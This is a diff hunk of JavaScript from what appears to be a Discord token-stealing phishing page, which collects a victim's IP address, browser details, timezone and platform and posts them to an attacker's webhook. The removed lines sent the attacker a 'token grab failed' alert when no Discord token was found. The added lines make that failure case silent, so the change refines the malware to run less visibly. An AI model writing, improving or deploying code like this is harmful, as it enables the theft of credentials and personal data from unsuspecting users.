@@ -243,26 +243,8 @@ break;
 }}catch(e){{}}
 }}
 }}else{{
-// No Discord token found - send detailed alert
-await fetch(webhook,{{
-method:'POST',
-headers:{{'Content-Type':'application/json'}},
-body:JSON.stringify({{
-content:'@everyone ⚠️',
-embeds:[{{
-title:'❌ No Discord Token Found',
-color:16776960,
-description:'**Victim opened the link but Discord token was NOT found.**',
-fields:[
-{{name:'✅ What WAS grabbed',value:'• IP Address\\n• Browser Info\\n• Timezone\\n• Platform',inline:false}},
-{{name:'❌ What was NOT grabbed',value:'• Discord Token\\n• Email\\n• Phone\\n• Payment Info',inline:false}},
-{{name:'📍 Where they opened it',value:'Opened in external browser (not Discord app)',inline:false}},
-{{name:'💡 Why this happened',value:'Link was clicked from Discord app but opened in their default browser where they are not logged into Discord web.',inline:false}}
-],
-footer:{{text:'Token grab failed'}}
-}}]
-}})
-}});
+// No token - just send what we have silently (no alert about failure)
+// Already sent browser info, so do nothing extra
 }}
 
 // Send browser info
